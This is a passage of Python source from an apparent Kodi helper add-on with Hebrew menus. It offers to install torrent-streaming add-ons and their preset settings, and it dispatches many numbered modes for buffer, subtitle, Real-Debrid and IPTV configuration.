  user_dataDir=xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/script.module.libtorrent' ) )
  if not os.path.exists(user_dataDir): # check if folder doesnt exist 
     os.makedirs(user_dataDir) # create if it doesnt
  logging.warning(modes)

    
  if modes=='manual':
    if target=='torrenter':
       for item in torrenter():
         link=item.split('$$$')[0]
         name1=item.split('$$$')[1]
         name_ext=item.split('$$$')[2]
         name_ext_master=name_ext+'-master'
         
         if os.path.exists(translatepath("special://home/addons/") + name_ext) or os.path.exists(translatepath("special://home/addons/") + name_ext_master):
           name='[COLOR skyblue]'+name1+'[/COLOR]'
         else:
           name =name1
         addDir2(name,link+'$$$'+name+'$$$'+name_ext,6,__PLUGIN_PATH__ + "/resources/torrenter.png",__PLUGIN_PATH__ + "/resources/torrenter.png","התקן את טורנטר")
  

    elif target=='popcorn':
      if os.path.exists(translatepath("special://home/addons/") + 'plugin.video.kodipopcorntime.repository'):
           name='[COLOR skyblue]kodipopcorntime.repository[/COLOR]'
      else:
          name='kodipopcorntime.repository'
      addDir2(name,'https://github.com/markop159/Markop159-repository/raw/master/Releases/plugin.video.kodipopcorntime.repository/plugin.video.kodipopcorntime.repository-1.1.0.zip$$$'+name+'$$$plugin.video.kodipopcorntime.repository',6,__PLUGIN_PATH__ + "/resources/popcorn.jpg",__PLUGIN_PATH__ + "/resources/popcorn.jpg","התקן את קודי פופקורן")
      
      if os.path.exists(translatepath("special://home/addons/") + 'plugin.video.kodipopcorntime'):
           name='[COLOR skyblue]Kodi Popcorntime[/COLOR]'
      else:
          name ='Kodi Popcorntime'
      addDir2(name,'https://kodihub.net/ofbk6$$$'+name+'$$$plugin.video.kodipopcorntime',6,__PLUGIN_PATH__ + "/resources/popcorn.jpg",__PLUGIN_PATH__ + "/resources/popcorn.jpg","התקן את קודי פופקורן")

   
      addDir2("תיקון הגדרות ההרחבה",__PLUGIN_PATH__ + "/resources/popcorn/"+type+'_setting.xml$$$'+xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/plugin.video.kodipopcorntime' ) ),6,__PLUGIN_PATH__ + "/resources/popcorn.jpg",__PLUGIN_PATH__ + "/resources/popcorn.jpg","התקן את קודי פופקורן")
      

    elif target=='elementum':
       for item in elementum():
         link=item.split('$$$')[0]
         name1=item.split('$$$')[1]
         name_ext=item.split('$$$')[2]
         name_ext_master=name_ext+'-master'
         
         if os.path.exists(translatepath("special://home/addons/") + name_ext) or os.path.exists(translatepath("special://home/addons/") + name_ext_master):
           name='[COLOR skyblue]'+name1+'[/COLOR]'
         else:
           name =name1
         logging.warning(translatepath("special://home/addons/") + name_ext)
         addDir2(name,link+'$$$'+name+'$$$'+name_ext,6,__PLUGIN_PATH__ + "/resources/elementum.png",__PLUGIN_PATH__ + "/resources/elementum.png","התקן את אלמנטום")

      ###########settings#####################
       addDir2("תיקון הגדרות ההרחבה",__PLUGIN_PATH__ + "/resources/elementum/"+type+'_setting.xml$$$'+xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/plugin.video.elementum' ) ),6,__PLUGIN_PATH__ + "/resources/elementum.png",__PLUGIN_PATH__ + "/resources/elementum.png","התקן את אלמנטום")
    elif target=='gaia':
       for item in gaia():
         link=item.split('$$$')[0]
         name1=item.split('$$$')[1]
         name_ext=item.split('$$$')[2]
         name_ext_master=name_ext+'-master'
         
         if os.path.exists(translatepath("special://home/addons/") + name_ext) or os.path.exists(translatepath("special://home/addons/") + name_ext_master):
           name='[COLOR skyblue]'+name1+'[/COLOR]'
         else:
           name =name1
         logging.warning(translatepath("special://home/addons/") + name_ext)
         addDir2(name,link+'$$$'+name+'$$$'+name_ext,6,__PLUGIN_PATH__ + "/resources/gaia.png",__PLUGIN_PATH__ + "/resources/elementum.png","התקן את גאיה")

      ###########settings#####################
       addDir2("תיקון הגדרות ההרחבה",__PLUGIN_PATH__ + "/resources/elementum/"+type+'_setting.xml$$$'+xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/plugin.video.elementum' ) ),6,__PLUGIN_PATH__ + "/resources/elementum.png",__PLUGIN_PATH__ + "/resources/elementum.png","התקן את אלמנטום")
    elif target=='quasar':
       for item in quasar():
         link=item.split('$$$')[0]
         name1=item.split('$$$')[1]
         name_ext=item.split('$$$')[2]
         name_ext_master=name_ext+'-master'
         
         if os.path.exists(translatepath("special://home/addons/") + name_ext) or os.path.exists(translatepath("special://home/addons/") + name_ext_master):
           name='[COLOR skyblue]'+name1+'[/COLOR]'
         else:
           name =name1
         logging.warning(translatepath("special://home/addons/") + name_ext)
         addDir2(name,link+'$$$'+name+'$$$'+name_ext,6,__PLUGIN_PATH__ + "/resources/quasar.png",__PLUGIN_PATH__ + "/resources/quasar.png","התקן את קוואסר")
      ###########settings#####################
       addDir2("תיקון הגדרות ההרחבה",__PLUGIN_PATH__ + "/resources/quasar/"+type+'_setting.xml$$$'+xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/plugin.video.quasar' ) ),6,__PLUGIN_PATH__ + "/resources/quasar.png",__PLUGIN_PATH__ + "/resources/quasar.png","התקן את קווסאר")
       
  elif modes=='auto':
       
       if target=='torrenter':
         for item in torrenter():
           install_package(item,'NO','auto')

         install_package(__PLUGIN_PATH__ + "/resources/torrenter/"+type+'_setting.xml$$$'+xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/plugin.video.torrenter' ) ),'NO','auto')
         dialog = xbmcgui.Dialog()
         dialog.ok("Kodi Setting", 'סיימנו - הקודי יסגר כעת')
         os._exit(1)
       elif target=='anonymouswall':
         install_package('https://github.com/kodianonymous1/moviewall/blob/master/plugin.video.anonymous.wall.zip?raw=true$$$'+'anonymouswall'+'$$$plugin.video.anonymous.wall','NO','auto')
         Install_moviewall()
         dialog = xbmcgui.Dialog()
         dialog.ok("Kodi Setting", 'קיר סרטים הותקן בהצלחה')
         xbmc.executebuiltin("ReloadSkin()")
         #os._exit(1)

       elif target=='elementum':
         for item in elementum():
           install_package(item,'NO','auto')

         install_package(__PLUGIN_PATH__ + "/resources/elementum/"+type+'_setting.xml$$$'+xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/plugin.video.elementum' ) ),'NO','auto')
         dialog = xbmcgui.Dialog()
         dialog.ok("Kodi Setting", 'סיימנו,יש להפעיל מחדש את הקודי')
         os._exit(1)
       elif target=='gaia':
         for item in gaia():
           install_package(item,'NO','auto')

         install_package(__PLUGIN_PATH__ + "/resources/gaia/"+type+'_setting.xml$$$'+xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/plugin.video.elementum' ) ),'NO','auto')
         dialog = xbmcgui.Dialog()
         dialog.ok("Kodi Setting", 'סיימנו,יש להפעיל מחדש את הקודי')
         os._exit(1)
       elif target=='quasar':
         for item in quasar():
           install_package(item,'NO','auto')

         install_package(__PLUGIN_PATH__ + "/resources/quasar/"+type+'_setting.xml$$$'+xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/plugin.video.quasar' ) ),'NO','auto')
         dialog = xbmcgui.Dialog()
         dialog.ok("Kodi Setting", 'סיימנו,יש להפעיל מחדש את הקודי')
         os._exit(1)
       elif target=='popcorn':
         for item in popcorntime():
           install_package(item,'NO','auto')

         install_package(__PLUGIN_PATH__ + "/resources/quasar/"+type+'_setting.xml$$$'+xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/plugin.video.quasar' ) ),'NO','auto')
         dialog = xbmcgui.Dialog()
         dialog.ok("Kodi Setting", 'סיימנו,יש להפעיל מחדש את הקודי')
         os._exit(1)
		 
params=get_params()

url=None
name=None
mode=None
iconimage=None
fanart=None
description=None


try:
        url=unque(params["url"])
except:
        pass
try:
        name=unque(params["name"])
except:
        pass
try:
        iconimage=unque(params["iconimage"])
except:
        pass
try:        
        mode=int(params["mode"])
except:
        pass
try:        
        fanart=unque(params["fanart"])
except:
        pass
try:        
        description=unque(params["description"])
except:
        pass
   
# print "Mode: "+str(mode)
# print "URL: "+str(url)
# print "Name: "+str(name)

if mode==None or url==None or len(url)<1:
        main_menu()
elif mode==2:
        torent_menu()
elif mode==3:
        popcorn_menu()
elif mode==4:
        gdrive_menu()
elif mode==5:
        install_pack(url)
elif mode==6:
      install_package(url,'yes')
elif mode==7:
        kmedia_menu()
elif mode==8:
        metaliq_fix()
elif mode==9:
        quasar_menu()
elif mode==10:
        clean_folders()
elif mode==11:
        fix_buffer()
elif mode==12:
      run_or_install(url)
elif mode==13:
        elementum_menu()
elif mode==14:
        clean_pass()
elif mode==15:
        fix_font()
elif mode==16:
        fix_wizard()
elif mode==17:
        last_play()
elif mode==18:
        normal_metalliq()
elif mode==19:
        fast_metalliq()
elif mode==20:
        fix_buffer2()
elif mode==21:
        fix_buffer3()
elif mode==22:
        movie_update()
elif mode==23:
        skin_pfix()
elif mode==231:

        resetForcedView()
elif mode==24:
        skin_efix()
elif mode==200:
        resetSKinSetting()
elif mode==25:
        fix_buffer4()
elif mode==26:
        gaia_menu()
elif mode==27:
        shurtcut()
elif mode==28:
        disshurtcut()
elif mode==29:
        Fullbuild()
elif mode==30:
        Install_moviewall()
elif mode==31:
        Install_moviewall2()
elif mode==32:
        disfix_font()
elif mode==33:
        fix_buffer5()
#============התקנת הרחבות======================
elif mode==34:
        torrenter()
elif mode==35:
        quasar()
elif mode==36:
        elementum()
elif mode==37:
        popcorntime()
elif mode==38:
        gaia()
#===========
elif mode==39:
        fix_buffer6()
elif mode==40:
        speed_test()
elif mode==41:
        VICTORYRD_OFF()
elif mode==42:
        VICTORYRD_ON()
elif mode==43:
       RD_All()
elif mode==44:
       SUBS_English()
elif mode==45:
       SUBS_Spanish()
elif mode==46:
       SUBS_Russian()
elif mode==416:
       SUBS_Portugezit()
elif mode==47:
       SUBS_Hebrew()
elif mode==48:
       USER_KODI()
elif mode==49:
       USER_KODIOFF()
elif mode==80:
       DIS_WIDGET()
elif mode==81:
        VICTORY_AutoplayOFF()
elif mode==82:
        VICTORY_AutoplayON()
elif mode==70:
        reset_telemedia()
elif mode==288:
        telemediaMod()
elif mode==289:
        victoryMod()
        
elif mode==290:
        purnpass()
elif mode==291:

    DIALOG         = xbmcgui.Dialog()
    choice = DIALOG.yesno(ADDONTITLE, "האם תרצה להגדיר את חשבון ה IPTV?", yeslabel="[B][COLOR WHITE]כן[/COLOR][/B]", nolabel="[B][COLOR white]לא[/COLOR][/B]")
    if choice == 1:
        xbmc.executebuiltin("RunPlugin(plugin://pvr.iptvsimple)")
        xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
        # xbmc.getCondVisibility('System.HasAddon({0})'.format('pvr.iptvsimple')) 
    
        # # iptvkodi17()
        # xbmc.executebuiltin("RunPlugin(plugin://plugin.video.idanplus/?mode=4&amp;module=iptv)")
        # xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
        # # iptvidanplus()
        # if KODI_VERSION<=17:
            # xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')
            # xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
    else:
     sys.exit()



        
elif mode==292:
        iptvkodi18win()
elif mode==293:
  
 iptvkodi18android()
elif mode==294:
 iptv()
elif mode==295:



    DIALOG         = xbmcgui.Dialog()
    choice = DIALOG.yesno(ADDONTITLE, "האם תרצה להגדיר את ערוצי עידן פלוס בטלוויזיה חיה? שימו לב זה ימחק לכם את מנוי ה IPTV שלכם", yeslabel="[B][COLOR WHITE]כן[/COLOR][/B]", nolabel="[B][COLOR white]לא[/COLOR][/B]")
    if choice == 1:
        xbmc.executebuiltin("RunPlugin(plugin://plugin.video.idanplus/?mode=4&amp;module=iptv)")
        xbmc.executebuiltin( "ActivateWindow(home)" )
        # iptvidanplus()
        # xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
    else:
     sys.exit()






elif mode==296:
        userkey(urlx)

elif mode==297:

    iptvkodi17()
elif mode=='purnpass'   : purnpass()


elif mode==50:     addons()
elif mode==51:     buffer()
elif mode==52:     kodi_usermenu()
elif mode==53:     USER_KODION()
elif mode==54:     rd_menu()
elif mode==55:     RD_resolveurl()
elif mode==56:     RD_seren()
elif mode==57:     RD_gaia()
elif mode==181:    Set_victory()
elif mode==182:    Set_OSD()
elif mode==183:    setrealdebrid()
elif mode==184:    rdoff()
elif mode==185:    logsend()#logsendme(enable_debug_notice=True)#logsend()
elif mode==186:    set_nextup()

if len(sys.argv)>0:

   xbmcplugin.endOfDirectory(int(sys.argv[1]))
